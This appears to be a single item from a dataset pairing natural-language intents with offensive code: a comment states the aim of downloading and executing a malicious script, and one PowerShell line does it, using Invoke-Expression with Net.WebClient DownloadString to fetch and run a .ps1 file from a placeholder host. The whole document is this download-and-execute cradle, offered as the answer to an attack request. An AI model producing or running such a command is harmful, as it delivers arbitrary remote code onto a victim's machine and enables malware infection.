# Natural language intent:
# Invoke PowerShell Expression to download and execute a malicious script from a specific website.

Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.website.com/maliciouscode.ps1')"
